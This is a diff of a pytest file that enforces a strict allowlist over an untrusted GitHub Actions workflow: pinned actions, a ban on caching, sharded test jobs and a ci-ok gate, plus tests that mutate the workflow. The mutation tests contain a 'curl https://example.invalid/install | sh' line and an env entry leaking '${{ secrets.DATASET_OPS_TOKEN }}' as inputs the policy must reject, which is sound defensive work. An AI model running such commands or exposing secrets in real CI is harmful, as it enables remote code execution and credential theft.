@@ -794,108 +794,223 @@ def _workflow(name: str) -> dict[str, object]:
     raise AssertionError(f"workflow is not tracked: {name}")
 
 
+# ci.yml is an UNTRUSTED workflow: `pull_request` makes it execute fork-authored
+# code on a runner that also holds a checkout of this repository. The
+# closed-world allowlist below is the control that keeps that safe. Every job,
+# every ordered step, and every action pin is matched exactly, so a step added
+# to public CI has to be *declared* here rather than inferred, and the mutation
+# tests underneath prove the allowlist still bites.
+#
+# The job graph grew from one serial `test` job to `secrets` / `lint` / `test`
+# (a 4-way shard matrix) / `ci-ok`, and `push` is now restricted to `main` so a
+# PR no longer runs this workflow twice on the identical commit. Splitting the
+# work does not relax the contract -- each job carries its own exact step
+# allowlist, and `ci-ok` is the single job branch protection points at.
+#
+# Two obvious speedups stay deliberately OFF, and this is the file that keeps
+# them off. Because the workflow runs untrusted code and the GitHub Actions
+# cache is shared across branches, a poisoned fork-PR cache entry would be
+# restored by a later trusted run on `main` (see aa5e2c0). So `actions/cache` is
+# forbidden outright and setup-uv keeps `enable-cache: false`. Neither costs
+# much: on a runner `uv sync` is ~21s and the model fetch is ~900KB / ~1s.
+_ACTION_PIN = re.compile(r"^[^@]+@[0-9a-f]{40}$")
+
+_CHECKOUT_STEP = {
+    "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
+    "with": {"persist-credentials": "false"},
+}
+
+_SETUP_UV_STEP = {
+    "uses": "astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
+    "with": {"enable-cache": "false", "version": "0.11.27"},
+}
+
+# gitleaks needs only the checked-out tree and docker -- no uv, no apt, no
+# models -- so it is its own job and starts reporting in seconds.
+_SECRETS_STEPS = [
+    _CHECKOUT_STEP,
+    {
+        "name": "Scan tracked tree for secrets",
+        "run": (
+            'docker run --rm -v "$GITHUB_WORKSPACE:/repo:ro" '
+            "zricethezav/gitleaks@sha256:"
+            "691af3c7c5a48b16f187ce3446d5f194838f91238f27270ed36eef6359a574d9 "
+            "detect --source=/repo --no-git --redact --exit-code=1"
+        ),
+    },
+]
+
+# Static checks. This job deliberately carries NO apt step and NO model fetch:
+# ruff, import-linter, verify_scope_fidelity.py and `docker compose config` read
+# the repo tree and nothing else, so the ~28s ffmpeg/fonts install and the model
+# download buy it nothing. Scope fidelity runs a tracked in-repo Python script
+# over this same checkout: it greps for env-provisioned facility identity and
+# camera roster residue, fetches nothing, reads no secret, starts no container,
+# and re-checks out no other repository. The compose step only renders config
+# from the tracked, placeholder-only .env.edge.prod.example (never the
+# gitignored real .env.edge.prod), pulls no images and starts no containers.
+_LINT_STEPS = [
+    _CHECKOUT_STEP,
+    _SETUP_UV_STEP,
+    {"run": "uv sync --frozen --group lint"},
+    {"run": "uv run --group lint ruff check ."},
+    {"run": "uv run --group lint lint-imports"},
+    {
+        "name": (
+            "Scope fidelity "
+            "(no env-provisioned identity or camera roster)"
+        ),
+        "run": (
+            "uv run python scripts/verify_scope_fidelity.py --fixture\n"
+            "uv run python scripts/verify_scope_fidelity.py --repo\n"
+        ),
+    },
+    {
+        "name": "Edge env example renders (GPU + CPU-only overlay)",
+        "run": (
+            "docker compose --env-file .env.edge.prod.example \\\n"
+            "  -f compose.edge.yaml -f compose.edge.cpu.yaml config -q\n"
+        ),
+    },
+]
+
+# The whole cost centre: pytest was 18m27s of a 19m37s run. fonts-noto-cjk
+# provisions the same real CJK glyph file the runtime image installs
+# (Dockerfile.edge); it is a plain distro apt package that fetches no other
+# repository, reads no secret, starts no container and re-checks out nothing, so
+# it stays admissible under this closed-world contract.
+#
+# The marker filter is byte-for-byte what it has always been. Sharding is a
+# deterministic round-robin over the sorted *tracked* test files, which is why
+# it adds no dependency to uv.lock -- pytest-split or pytest-xdist would each
+# add one, and a new PyPI dependency resolved at CI time in an untrusted
+# workflow is exactly the supply-chain surface this file exists to bound. If a
+# shard ever collects nothing the step fails loudly rather than passing empty.
+_TEST_STEPS = [
+    _CHECKOUT_STEP,
+    _SETUP_UV_STEP,
+    {
+        "name": "Install FFmpeg and packaged CJK overlay font",
+        "run": (
+            "sudo apt-get update && "
+            "sudo apt-get install -y --no-install-recommends "
+            "ffmpeg fonts-noto-cjk"
+        ),
+    },
+    {"run": "uv sync --frozen --group lint"},
+    {
+        "name": "Fetch packaged default LSTM model",
+        "run": "bash scripts/fetch-models.sh",
+    },
+    {
+        "name": "Run test shard ${{ matrix.shard }} of 4",
+        "run": (
+            "mapfile -t shard_files < <(\n"
+            "  git ls-files 'tests/test_*.py' | sort |\n"
+            '    awk -v shard="${{ matrix.shard }}" '
+            '-v total="$SHARD_TOTAL" \\\n'
+            "      'NR % total == shard % total'\n"
+            ")\n"
+            'if [ "${#shard_files[@]}" -eq 0 ]; then\n'
+            '  echo "shard ${{ matrix.shard }} collected no test files" >&2\n'
+            "  exit 1\n"
+            "fi\n"
+            'echo "shard ${{ matrix.shard }}/$SHARD_TOTAL: '
+            '${#shard_files[@]} files"\n'
+            'uv run pytest -q -m '
+            '"not real_stack and not heavy and not integration" \\\n'
+            '  "${shard_files[@]}"\n'
+        ),
+    },
+]
+
+# Branch protection points at this one job. `needs` alone is not enough under
+# `if: always()`: a skipped or cancelled dependency would let it pass, so every
+# dependency's result is asserted explicitly.
+_CI_OK_STEPS = [
+    {
+        "name": "Assert every required job succeeded",
+        "run": (
+            "failed=0\n"
+            "for entry in \\\n"
+            '  "secrets=${{ needs.secrets.result }}" \\\n'
+            '  "lint=${{ needs.lint.result }}" \\\n'
+            '  "test=${{ needs.test.result }}"; do\n'
+            '  name="${entry%%=*}"\n'
+            '  result="${entry#*=}"\n'
+            '  echo "$name: $result"\n'
+            '  if [ "$result" != "success" ]; then\n'
+            "    failed=1\n"
+            "  fi\n"
+            "done\n"
+            'exit "$failed"\n'
+        ),
+    },
+]
+
+_EXPECTED_JOBS: dict[str, dict[str, object]] = {
+    "secrets": {"runs-on": "ubuntu-latest", "steps": _SECRETS_STEPS},
+    "lint": {"runs-on": "ubuntu-latest", "steps": _LINT_STEPS},
+    "test": {
+        "runs-on": "ubuntu-latest",
+        "strategy": {
+            # One shard's failure must not hide the other shards' results.
+            "fail-fast": "false",
+            "matrix": {"shard": ["1", "2", "3", "4"]},
+        },
+        "env": {"SHARD_TOTAL": "4"},
+        "steps": _TEST_STEPS,
+    },
+    "ci-ok": {
+        "runs-on": "ubuntu-latest",
+        "needs": ["secrets", "lint", "test"],
+        "if": "always()",
+        "steps": _CI_OK_STEPS,
+    },
+}
+
+
 def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
-    assert set(workflow) == {"jobs", "name", "on", "permissions"}
-    assert workflow["on"] == {"pull_request": "", "push": ""}
+    # `concurrency` is the only top-level key added to the original
+    # {jobs, name, on, permissions} set; anything else (env, defaults, a
+    # workflow-level secret) still fails here.
+    assert set(workflow) == {"concurrency", "jobs", "name", "on", "permissions"}
+
+    # `push` is branch-filtered to main so a PR stops running this workflow
+    # twice (once for push, once for pull_request) on the identical commit.
+    assert workflow["on"] == {
+        "pull_request": "",
+        "push": {"branches": ["main"]},
+    }
     assert workflow["permissions"] == {"contents": "read"}
+
+    # Superseded PR runs are cancelled; main runs are never cancelled, so the
+    # default branch keeps an unbroken status history.
+    assert workflow["concurrency"] == {
+        "group": "ci-${{ github.workflow }}-${{ github.ref }}",
+        "cancel-in-progress": "${{ github.event_name == 'pull_request' }}",
+    }
 
     jobs = workflow["jobs"]
     assert isinstance(jobs, dict)
-    assert set(jobs) == {"test"}
-    job = jobs["test"]
-    assert isinstance(job, dict)
-    assert set(job) == {"runs-on", "steps"}
-    assert job["runs-on"] == "ubuntu-latest"
-    steps = job["steps"]
-    assert isinstance(steps, list)
-    assert steps == [
-        {
-            "uses": "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
-            "with": {"persist-credentials": "false"},
-        },
-        {
-            "name": "Scan tracked tree for secrets",
-            "run": (
-                'docker run --rm -v "$GITHUB_WORKSPACE:/repo:ro" '
-                "zricethezav/gitleaks@sha256:"
-                "691af3c7c5a48b16f187ce3446d5f194838f91238f27270ed36eef6359a574d9 "
-                "detect --source=/repo --no-git --redact --exit-code=1"
-            ),
-        },
-        {
-            "uses": "astral-sh/setup-uv@"
-            "d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86",
-            "with": {"enable-cache": "false", "version": "0.11.27"},
-        },
-        # fonts-noto-cjk provisions the same real CJK glyph file the runtime
-        # image installs (Dockerfile.edge). It is a plain distro apt package:
-        # it fetches no other repository, reads no secret, starts no container,
-        # and re-checks out nothing, so it stays admissible under this
-        # closed-world contract. Declared here because a step added to public
-        # CI must be listed, not inferred.
-        {
-            "name": "Install FFmpeg and packaged CJK overlay font",
-            "run": (
-                "sudo apt-get update && "
-                "sudo apt-get install -y --no-install-recommends "
-                "ffmpeg fonts-noto-cjk"
-            ),
-        },
-        {"run": "uv sync --frozen --group lint"},
-        {
-            "name": "Fetch packaged default LSTM model",
-            "run": "bash scripts/fetch-models.sh",
-        },
-        # Real-stack E2E (mediamtx-backed) is deselected here by marker, not by
-        # adding a step -- the security contract below (step count/order, no
-        # external-binary fetch) is unchanged; only this step's own argument
-        # changed. See tests/AGENTS.md for running the real-stack E2E locally.
-        # 무거운 워치독 테스트는 CI에서 뺀다(`heavy`). 실제 서브프로세스가
-        # 벽시계 deadline으로 죽기를 기다리므로 부하 걸린 러너에서 기동만으로
-        # 넘긴다. 이 문자열이 바뀌면 CI가 무엇을 돌리는지 바뀐 것이므로
-        # 여기서 잡는 것이 맞다 — 자동으로 따라가게 하지 않는다.
-        # `integration` also deselects here, which is what pyproject.toml's
-        # marker description already promised ("excluded from the default CI
-        # suite") while this argument did not deliver it. Its one test drives a
-        # live enrolled ml-api via CLOUD_EDGE_ML_URL, so on a runner it can only
-        # fail on the missing env -- and it did, on main.
-        {
-            "run": (
-                "uv run pytest -q -m "
-                '"not real_stack and not heavy and not integration"'
-            )
-        },
-        {"run": "uv run --group lint ruff check ."},
-        {"run": "uv run --group lint lint-imports"},
-        # Scope fidelity runs a tracked in-repo Python script over this same
-        # checkout: it greps for env-provisioned facility identity and camera
-        # roster residue. It fetches nothing, reads no secret, starts no
-        # container, and re-checks out no other repository, so it is admissible
-        # under this closed-world contract. Listing it here is the point of the
-        # contract -- a step added to public CI must be declared, not inferred.
-        {
-            "name": (
-                "Scope fidelity "
-                "(no env-provisioned identity or camera roster)"
-            ),
-            "run": (
-                "uv run python scripts/verify_scope_fidelity.py --fixture\n"
-                "uv run python scripts/verify_scope_fidelity.py --repo\n"
-            ),
-        },
-        # #179/#182: the shipped example must render on its own -- this only
-        # renders and validates compose config from the tracked, placeholder-
-        # only .env.edge.prod.example (never the gitignored real
-        # .env.edge.prod), pulls no images, starts no containers, uses no
-        # secrets/tokens, and re-checks out no other repository.
-        {
-            "name": "Edge env example renders (GPU + CPU-only overlay)",
-            "run": (
-                "docker compose --env-file .env.edge.prod.example \\\n"
-                "  -f compose.edge.yaml -f compose.edge.cpu.yaml config -q\n"
-            ),
-        },
-    ]
+    assert set(jobs) == set(_EXPECTED_JOBS)
+
+    for name, expected in _EXPECTED_JOBS.items():
+        job = jobs[name]
+        assert isinstance(job, dict), name
+        # Exact key set: no job may add `permissions`, `container`,
+        # `continue-on-error`, `if`, `env`, or a self-hosted runner.
+        assert set(job) == set(expected), name
+        assert job == expected, name
+
+        steps = job["steps"]
+        assert isinstance(steps, list), name
+        for step in steps:
+            assert isinstance(step, dict), name
+            # Every action is pinned to a full 40-hex commit SHA -- a tag or a
+            # branch would let the upstream repository change under us.
+            if "uses" in step:
+                assert _ACTION_PIN.match(str(step["uses"])), (name, step["uses"])
 
     serialized = yaml.safe_dump(workflow)
     assert "eldercare-dataset-ops" not in serialized
@@ -903,6 +1018,11 @@ def _assert_untrusted_ci_security(workflow: dict[str, object]) -> None:
     assert ".dataset-ops" not in serialized
     assert "upload-artifact" not in serialized
     assert "actions/cache" not in serialized
+    # No job may read a repository secret: this workflow runs fork code. The
+    # `${{ secrets.` prefix is matched rather than a bare "secrets", because the
+    # gitleaks job is itself named `secrets` and `ci-ok` reads
+    # `needs.secrets.result`.
+    assert "${{ secrets." not in serialized
 
 
 @pytest.mark.parametrize("mode", [b"120000", b"160000"])
@@ -916,24 +1036,37 @@ def test_untrusted_ci_has_no_private_repository_access() -> None:
 
 
 @pytest.mark.parametrize(
-    ("step_index", "field", "value"),
+    ("job", "step_index", "field", "value"),
     [
-        (0, "uses", "actions/checkout@v4"),
-        (1, "run", "echo gitleaks@sha256:placeholder"),
-        (2, "uses", "astral-sh/setup-uv@v5"),
-        (3, "run", "curl https://example.invalid/install | sh"),
-        (6, "run", "uvx ruff check ."),
+        # Unpinned actions, in every job that uses one.
+        ("secrets", 0, "uses", "actions/checkout@v4"),
+        ("lint", 0, "uses", "actions/checkout@v4"),
+        ("lint", 1, "uses", "astral-sh/setup-uv@v5"),
+        ("test", 0, "uses", "actions/checkout@v4"),
+        ("test", 1, "uses", "astral-sh/setup-uv@v5"),
+        # An unpinned gitleaks image is the same class of hole as an unpinned
+        # action: the tag can be moved under us.
+        ("secrets", 1, "run", "echo gitleaks@sha256:placeholder"),
+        # Fetching and running an external binary from the network.
+        ("lint", 2, "run", "curl https://example.invalid/install | sh"),
+        ("test", 2, "run", "curl https://example.invalid/install | sh"),
+        # Swapping a locked, audited toolchain for an ad-hoc resolve.
+        ("lint", 3, "run", "uvx ruff check ."),
+        # Silently widening what the shard actually runs.
+        ("test", 5, "run", "uv run pytest -q tests/"),
+        # The gate must not be turned into a no-op.
+        ("ci-ok", 0, "run", "true"),
     ],
 )
 def test_untrusted_ci_policy_rejects_security_mutations(
-    step_index: int, field: str, value: str
+    job: str, step_index: int, field: str, value: str
 ) -> None:
     workflow = copy.deepcopy(_workflow("ci.yml"))
     jobs = workflow["jobs"]
     assert isinstance(jobs, dict)
-    job = jobs["test"]
-    assert isinstance(job, dict)
-    steps = job["steps"]
+    target = jobs[job]
+    assert isinstance(target, dict)
+    steps = target["steps"]
     assert isinstance(steps, list)
     steps[step_index][field] = value
 
@@ -944,10 +1077,15 @@ def test_untrusted_ci_policy_rejects_security_mutations(
 @pytest.mark.parametrize(
     ("field", "value"),
     [
-        ("on", {"push": "", "pull_request": {"paths": ["src/**"]}}),
+        # Re-widening `push` reinstates the duplicate run per PR.
+        ("on", {"push": "", "pull_request": ""}),
+        ("on", {"push": {"branches": ["main"]}, "pull_request": {"paths": ["src/**"]}}),
         ("permissions", {"contents": "write"}),
         ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
         ("defaults", {"run": {"shell": "bash"}}),
+        # Cancelling in-progress runs on main would break the default branch's
+        # status history.
+        ("concurrency", {"group": "ci", "cancel-in-progress": "true"}),
     ],
 )
 def test_untrusted_ci_policy_rejects_boundary_mutations(
@@ -970,6 +1108,56 @@ def test_untrusted_ci_policy_rejects_extra_job() -> None:
         _assert_untrusted_ci_security(workflow)
 
 
+def test_untrusted_ci_policy_rejects_removed_job() -> None:
+    workflow = copy.deepcopy(_workflow("ci.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    # Dropping a job from the graph must not silently pass; `ci-ok` is what
+    # branch protection watches, so losing `secrets` has to be caught here.
+    del jobs["secrets"]
+
+    with pytest.raises(AssertionError):
+        _assert_untrusted_ci_security(workflow)
+
+
+@pytest.mark.parametrize("job", ["secrets", "lint", "test", "ci-ok"])
+def test_untrusted_ci_policy_rejects_cache_step(job: str) -> None:
+    workflow = copy.deepcopy(_workflow("ci.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    target = jobs[job]
+    assert isinstance(target, dict)
+    steps = target["steps"]
+    assert isinstance(steps, list)
+    # The Actions cache is shared across branches and this workflow runs fork
+    # code, so a cache entry poisoned by a fork PR would be restored by a later
+    # trusted run on main (aa5e2c0).
+    steps.append(
+        {
+            "uses": "actions/cache@0000000000000000000000000000000000000000",
+            "with": {"path": "models", "key": "models-pinned-revision"},
+        }
+    )
+
+    with pytest.raises(AssertionError):
+        _assert_untrusted_ci_security(workflow)
+
+
+def test_untrusted_ci_policy_rejects_uv_cache_opt_in() -> None:
+    workflow = copy.deepcopy(_workflow("ci.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    lint = jobs["lint"]
+    assert isinstance(lint, dict)
+    steps = lint["steps"]
+    assert isinstance(steps, list)
+    # setup-uv's own cache is the same Actions cache backend as actions/cache.
+    steps[1]["with"]["enable-cache"] = "true"
+
+    with pytest.raises(AssertionError):
+        _assert_untrusted_ci_security(workflow)
+
+
 @pytest.mark.parametrize(
     ("field", "value"),
     [
@@ -977,6 +1165,8 @@ def test_untrusted_ci_policy_rejects_extra_job() -> None:
         ("if", "false"),
         ("runs-on", "self-hosted"),
         ("env", {"LEAK": "${{ secrets.DATASET_OPS_TOKEN }}"}),
+        ("permissions", {"contents": "write"}),
+        ("container", "ghcr.io/example/untrusted:latest"),
     ],
 )
 def test_untrusted_ci_policy_rejects_job_mutations(
@@ -988,6 +1178,22 @@ def test_untrusted_ci_policy_rejects_job_mutations(
     job = jobs["test"]
     assert isinstance(job, dict)
     job[field] = value
+
+    with pytest.raises(AssertionError):
+        _assert_untrusted_ci_security(workflow)
+
+
+def test_untrusted_ci_policy_rejects_shard_matrix_change() -> None:
+    workflow = copy.deepcopy(_workflow("ci.yml"))
+    jobs = workflow["jobs"]
+    assert isinstance(jobs, dict)
+    job = jobs["test"]
+    assert isinstance(job, dict)
+    strategy = job["strategy"]
+    assert isinstance(strategy, dict)
+    # The shard count in the matrix and the `SHARD_TOTAL` the step partitions
+    # by must move together, or shards silently stop covering the whole suite.
+    strategy["matrix"] = {"shard": ["1", "2"]}
 
     with pytest.raises(AssertionError):
         _assert_untrusted_ci_security(workflow)
